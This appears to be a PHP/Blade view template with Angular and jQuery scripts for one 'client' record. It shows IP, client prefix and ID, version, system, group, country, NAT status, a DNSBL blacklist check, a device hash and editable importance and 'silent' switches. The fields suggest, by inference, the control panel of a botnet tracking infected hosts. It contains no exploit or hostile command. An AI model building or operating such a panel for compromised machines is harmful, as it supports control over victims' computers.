<link href="/template/css/bootstrap-switch.min.css" rel="stylesheet">
<script src="/template/js/bootstrap-switch.min.js"></script>

<table id="widget-client" class="table table-bordered table-condensed" data-clientid="{{ $client->id }}">
    <thead class="well">
    <tr>
        <th>Ip</th>
        <th>Prefix + Client</th>
        <th>Version</th>
        <th>System</th>
        <th>Group</th>
        <th>Country</th>
        <th>Last activity</th>
        <th>NAT</th>
        <th>DNSBL</th>
    </tr>
    </thead>
    <tbody class="well">
    <tr ng-controller="dnsblCtrl">
        <td>{{ $client->ip }}</td>
        <td>{{ $client->getFullName() }}</td>
        <td>{{ $client->client_ver }}</td>
        <td>{{ $client->sys_ver }}</td>
        <td>{{ $client->group }}</td>
        <td>{{ $client->country }}</td>
        <td>{{ $client->timeElapsed('last_activity') }}</td>
        <td>
            @if($client->getNat() == false)
                <i class="fa fa-times" aria-hidden="true"></i>
                <span class="glyphicon glyphicon-remove-sign"></span>
            @elseif($client->getNat() == true)
                <i class="fa fa-check" aria-hidden="true"></i>
            @else
                <i class="fa fa-question" aria-hidden="true"></i>
            @endif
        </td>
	    <td id="dnsbl" ng-class="class" role="alert">
            <img ng-show="loading" src="/template/img/loader.svg" alt="Loading..." />
        </td>
    </tr>
    </tbody>
    <tfoot class="well">
    <tr>
        <td colspan="9">
            <!-- IMPORTANCE -->
            {!! Form::open(null, ['class' => 'form-inline pull-left']) !!}
                <div style="display: inline-block; margin-right: 15px;">
                    <label>Importance:</label>
                    @if( ! Auth::instance()->get_user()->hasAction('Edit client importance') || $client->importance >= Model_Client::MIN_HIGH_IMPORTANCE && ! Auth::instance()->get_user()->hasAction('Edit client with high importance') )
                        <span style="font-weight: bold; color: #{{ $client->getImportanceColor() }};">{{ $client->importance }}</span>
                    @else
                       {!! Form::input('importance', $client->importance, [
                            'class' => 'form-control input-sm',
                            'style' => 'width: 72px;',
                            'type' => 'number',
                            'min' => 0,
                            'max' => Auth::instance()->get_user()->getDefaultMaxImportanceEdit()
                        ]) !!}
                    @endif
                </div>
            {!! Form::close() !!}

            {{-- SHOW EMPTY FIELDS --}}
            <div class="pull-left checkbox" style="margin-top: 3px; margin-bottom: 0">
                <label>
                    <script>
                        function hideEmptyFieldsSubmit(el){
                            if($('#hideEmptyFields').is(':checked')){
                                $('#hideEmptyFieldsUnchecked').prop('disabled', true)
                            }else{
                                $('#hideEmptyFieldsUnchecked').prop('disabled', false);
                            }
                            el.form.submit();
                        }
                    </script>
                    {!! Form::open() !!}
                        {!! Form::input('hideEmptyFields', null, [
                            'id' => 'hideEmptyFieldsUnchecked',
                            'type' => 'hidden'
                        ]) !!}
                        {!! Form::checkbox('hideEmptyFields', null, Session::instance()->get('hideEmptyFields'), [
                            'onChange' => 'hideEmptyFieldsSubmit(this)',
                            'id' => 'hideEmptyFields'
                        ]) !!} Hide empty fields
                    {!! Form::close() !!}
                </label>
            </div>

            {{-- DEVHASH --}}
            {!! Form::open('/devhashlookup', ['class' => 'form-inline pull-right', 'target' => '_blank']) !!}
                {!! Form::hidden('devhash', $client->getDevhashFormatted()) !!}
                <div class="form-group">
                    <label>Devhash:</label>
                    {!! Form::button('apply_filter', $client->getDevhashFormatted(), [
                        'type' => 'submit',
                        'class' => 'submit-link',
                        'style' => 'margin-top:3px;'
                    ]) !!}
                    @if($countSameDevhash)
                        <span class="text-muted" title="Count clients with same devhash">({{ $countSameDevhash }})</span>
                    @endif
                </div>
            {!! Form::close() !!}
                
            <div class="clearfix"></div>
        </td>
    </tr>
    </tfoot>
</table>

<script>
    app.controller('dnsblCtrl', function($scope, $http){
        $scope.loading = true;

        angular.element(document).ready(function () {
            $http.post('/rest/clients/dnsbl', {ip: "<?=$client->ip?>"}).success(function(data){
                $scope.loading = false;
                $scope.class = 'alert alert-';
                $scope.dnsbl = angular.element(document.querySelector('#dnsbl'));
                if(data) {
                    $scope.class += 'danger';
                    $scope.dnsbl.text('Listed');
                }else {
                    $scope.class += 'success';
                    $scope.dnsbl.text('Not listed');
                }
            });
        });
    });

    /* TODO need upd from jquery to angular */
    $(document).ready(function() {
        'use strict';

        var $scopeWidgetClient = $('#widget-client');
        
@if(Auth::instance()->get_user()->hasAction('Edit client importance'))
        var $inputImportance = $('input[name="importance"]');
        var importanceOld = $inputImportance.val();
        
        var updateImportanceColor = function() {
            var importance = parseInt($inputImportance.val(), 10);
            var color = (32 + importance * 2).toString(16) + '11' + (32 + (100 - importance) * 2).toString(16);
            $inputImportance.css('color', '#' + color);
        };
        updateImportanceColor();
        
        var xhrUpdateImportanceColor = null;
        var updateImportance = function() {
            if (xhrUpdateImportanceColor) {
                xhrUpdateImportanceColor.abort();
            }
            var importance = $inputImportance.val();
            xhrUpdateImportanceColor = $.ajax({
                url: '/ajax/log/importance',
                type: 'POST',
                data: {
                    clientid: $scopeWidgetClient.data('clientid'),
                    importance: importance
                }
            })
            .done(function() {
                importanceOld = importance;
            })
            .fail(function() {
                $inputImportance.val(importanceOld);
                updateImportanceColor();
            })
            .always(function() {
                xhrUpdateImportanceColor = null;
            });
        };
        
        var delayUpdateImportanceColor = null;
        $inputImportance.on('change', function(e) {
            updateImportanceColor();
            if (delayUpdateImportanceColor) {
                clearTimeout(delayUpdateImportanceColor);
            }
            delayUpdateImportanceColor = setTimeout(updateImportance, 1000);
        });
        var updaterImportanceColor = null;
        $inputImportance.on('keydown mousedown', function(e) {
            updaterImportanceColor = setInterval(function() {
                updateImportanceColor();
            }, 200);
        })
        .on('keyup mouseup', function(e) {
            if (updaterImportanceColor) {
                clearInterval(updaterImportanceColor);
                updaterImportanceColor = null;
            }
        });
@endif
        
@if( Auth::instance()->get_user()->hasAction('View and edit client silent'))
        $('[name="silent"]').bootstrapSwitch({
            labelText: 'Silent',
            onSwitchChange: function(event, state) {
                var $checkbox = $(event.target);
                $.ajax({
                    url: '/ajax/log/silent',
                    type: 'POST',
                    data: {
                        ':argClientID': $scopeWidgetClient.data('clientid'),
                        ':argSilent': state
                    }
                })
                .fail(function() {
                    $checkbox.bootstrapSwitch('state', !state, true);
                });
            }
        });
@endif
@if(Auth::instance()->get_user()->hasAction('View and edit client importance auto'))
        $('[name="importanceauto"]').bootstrapSwitch({
            labelText: 'Auto',
            onSwitchChange: function(event, state) {
                var $checkbox = $(event.target);
                $.ajax({
                    url: '/ajax/log/importanceauto',
                    type: 'POST',
                    data: {
                        ':argClientID': $scopeWidgetClient.data('clientid'),
                        ':argImportanceAuto': state
                    }
                })
                .fail(function() {
                    $checkbox.bootstrapSwitch('state', !state, true);
                });
            }
        });
@endif
    });
</script>